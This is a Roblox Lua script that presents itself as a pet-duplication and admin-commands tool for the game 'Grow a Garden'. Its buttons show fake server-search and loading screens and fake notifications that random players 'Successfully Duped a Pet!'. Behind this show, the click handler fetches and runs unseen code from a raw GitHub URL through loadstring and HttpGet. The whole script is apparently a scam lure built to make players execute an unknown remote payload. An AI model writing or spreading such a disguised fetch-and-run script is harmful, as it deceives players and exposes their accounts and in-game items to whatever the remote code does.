-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Cleanup existing GUIs
for _, gui in ipairs(playerGui:GetChildren()) do
	if gui.Name == "CustomGui" or gui.Name == "LoadingScreen" or gui.Name == "ScriptWaitUI" or gui.Name == "NotifHolder" then
		gui:Destroy()
	end
end

-- Notification system
local function createNotification(name)
	local holder = playerGui:FindFirstChild("NotifHolder")
	if not holder then
		holder = Instance.new("ScreenGui", playerGui)
		holder.Name = "NotifHolder"
		holder.IgnoreGuiInset = true

		local list = Instance.new("UIListLayout", holder)
		list.SortOrder = Enum.SortOrder.LayoutOrder
		list.Padding = UDim.new(0, 8)
		list.VerticalAlignment = Enum.VerticalAlignment.Bottom
	end

	local notif = Instance.new("TextLabel", holder)
	notif.Size = UDim2.new(0, 350, 0, 50)
	notif.Position = UDim2.new(1, -360, 1, -60)
	notif.AnchorPoint = Vector2.new(1, 1)
	notif.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	notif.TextColor3 = Color3.fromRGB(255, 255, 255)
	notif.Font = Enum.Font.GothamBold
	notif.TextSize = 20
	notif.Text = name .. " Successfully Duped a Pet!"
	notif.BackgroundTransparency = 1
	notif.TextTransparency = 1
	Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 12)

	local tweenIn = TweenService:Create(notif, TweenInfo.new(0.3), {
		BackgroundTransparency = 0,
		TextTransparency = 0
	})
	tweenIn:Play()
	tweenIn.Completed:Wait()

	task.delay(2, function()
		local tweenOut = TweenService:Create(notif, TweenInfo.new(0.3), {
			BackgroundTransparency = 1,
			TextTransparency = 1
		})
		tweenOut:Play()
		tweenOut.Completed:Wait()
		notif:Destroy()
	end)
end

-- Random name generator
local function randomName()
	local names = {"PixelKnight", "EpicNuke", "MasterMaker321", "DragonSlayer", "BlockyBoss", "SkyBlade", "NoobMaster", "DevGuy"}
	return names[math.random(1, #names)]
end

-- MAIN GUI
local mainGui = Instance.new("ScreenGui", playerGui)
mainGui.Name = "CustomGui"
mainGui.ResetOnSpawn = false

local frame = Instance.new("Frame", mainGui)
frame.Size = UDim2.new(0, 320, 0, 180)
frame.Position = UDim2.new(0.5, 0, 0.5, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

local layout = Instance.new("UIListLayout", frame)
layout.Padding = UDim.new(0, 12)
layout.FillDirection = Enum.FillDirection.Vertical
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.VerticalAlignment = Enum.VerticalAlignment.Center

-- BUTTON CREATOR
local function createButton(text)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(0.8, 0, 0, 45)
	btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	btn.Font = Enum.Font.GothamSemibold
	btn.Text = text
	btn.TextSize = 22
	btn.TextColor3 = Color3.fromRGB(220, 220, 220)
	btn.AutoButtonColor = false
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)

	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
	end)

	return btn
end

-- LOADING SCREEN (3s)
local function showLoadingScreen(message, callback)
	local scr = Instance.new("ScreenGui", playerGui)
	scr.Name = "LoadingScreen"
	scr.IgnoreGuiInset = true

	local bg = Instance.new("Frame", scr)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)

	local box = Instance.new("Frame", bg)
	box.Size = UDim2.new(0.6, 0, 0.3, 0)
	box.Position = UDim2.new(0.5, 0, 0.5, 0)
	box.AnchorPoint = Vector2.new(0.5, 0.5)
	box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)

	local lbl = Instance.new("TextLabel", box)
	lbl.Size = UDim2.new(0.9, 0, 0.3, 0)
	lbl.Position = UDim2.new(0.5, 0, 0.25, 0)
	lbl.AnchorPoint = Vector2.new(0.5, 0.5)
	lbl.BackgroundTransparency = 1
	lbl.Font = Enum.Font.GothamBold
	lbl.TextColor3 = Color3.fromRGB(240, 240, 240)
	lbl.TextSize = 24
	lbl.TextWrapped = true
	lbl.Text = message

	local percent = Instance.new("TextLabel", box)
	percent.Size = UDim2.new(0, 80, 0, 30)
	percent.Position = UDim2.new(0.5, 0, 0.5, 0)
	percent.AnchorPoint = Vector2.new(0.5, 0.5)
	percent.BackgroundTransparency = 1
	percent.Font = Enum.Font.Gotham
	percent.TextSize = 22
	percent.TextColor3 = Color3.fromRGB(200, 200, 200)
	percent.Text = "0%"

	local bgBar = Instance.new("Frame", box)
	bgBar.Size = UDim2.new(0.8, 0, 0, 10)
	bgBar.Position = UDim2.new(0.5, 0, 0.7, 0)
	bgBar.AnchorPoint = Vector2.new(0.5, 0.5)
	bgBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
	Instance.new("UICorner", bgBar).CornerRadius = UDim.new(1, 0)

	local bar = Instance.new("Frame", bgBar)
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
	Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)

	task.spawn(function()
		for i = 1, 100 do
			percent.Text = i .. "%"
			bar:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Quad", 0.01, true)
			wait(3/100)
		end

		TweenService:Create(box, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(lbl, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
		TweenService:Create(percent, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
		TweenService:Create(bgBar, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(bar, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		wait(0.5)
		scr:Destroy()
		callback()
	end)
end

-- 30s "Loading Script..." UI
local function showScriptWaitUI()
	local scr = Instance.new("ScreenGui", playerGui)
	scr.Name = "ScriptWaitUI"
	scr.IgnoreGuiInset = true

	local lbl = Instance.new("TextLabel", scr)
	lbl.Size = UDim2.new(0, 450, 0, 70)
	lbl.Position = UDim2.new(0.5, 0, 0.5, 0)
	lbl.AnchorPoint = Vector2.new(0.5, 0.5)
	lbl.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	lbl.Font = Enum.Font.GothamSemibold
	lbl.TextSize = 28
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	lbl.Text = "Loading Script Please Wait..."
	Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 16)

	local running = true
	task.spawn(function()
		while running do
			for i = 0, 3 do
				lbl.Text = "Loading Script Please Wait" .. string.rep(".", i)
				wait(0.5)
			end
		end
	end)

	task.delay(30, function()
		running = false
		scr:Destroy()
	end)
end

-- CLICK HANDLER
local function onClick(isDupe)
	mainGui.Enabled = false
	local msg = isDupe and "Finding A Compatible Server to Duplicate, Please Wait…" or "Finding a Compatible Server For Admin Commands, Please Wait…"
	showLoadingScreen(msg, function()
		showScriptWaitUI()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/refs/heads/main/growagarden.lua"))()
		end)
		createNotification(randomName())
	end)
end

-- ADD BUTTONS
local adminBtn = createButton("Admin Commands")
adminBtn.MouseButton1Click:Connect(function() onClick(false) end)

local dupeBtn = createButton("Dupe Now!")
dupeBtn.MouseButton1Click:Connect(function() onClick(true) end)
